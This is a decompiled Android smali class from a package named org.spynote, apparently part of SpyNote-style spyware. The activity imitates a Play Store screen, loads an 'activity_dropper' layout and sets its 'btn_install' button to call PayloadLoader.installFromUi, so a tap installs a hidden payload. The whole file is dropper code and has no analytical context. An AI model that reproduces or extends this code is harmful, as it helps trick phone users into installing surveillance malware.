.class public Lorg/spynote/PlayStoreActivity;
.super Landroid/app/Activity;
.implements Landroid/view/View$OnClickListener;
.source "PlayStoreActivity.java"


.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method


.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getResources()Landroid/content/res/Resources;
    move-result-object v0
    const-string v1, "activity_dropper"
    const-string v2, "layout"
    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getPackageName()Ljava/lang/String;
    move-result-object v3
    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
    move-result v0
    if-lez v0, :skip_layout
    invoke-virtual {p0, v0}, Lorg/spynote/PlayStoreActivity;->setContentView(I)V

    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getResources()Landroid/content/res/Resources;
    move-result-object v0
    const-string v1, "btn_install"
    const-string v2, "id"
    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getPackageName()Ljava/lang/String;
    move-result-object v3
    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
    move-result v0
    if-lez v0, :skip_layout
    invoke-virtual {p0, v0}, Lorg/spynote/PlayStoreActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    if-eqz v0, :skip_layout
    invoke-virtual {v0, p0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    :skip_layout
    return-void
.end method


.method public onClick(Landroid/view/View;)V
    .locals 0
    invoke-static {p0}, Lorg/spynote/PayloadLoader;->installFromUi(Landroid/content/Context;)V
    return-void
.end method
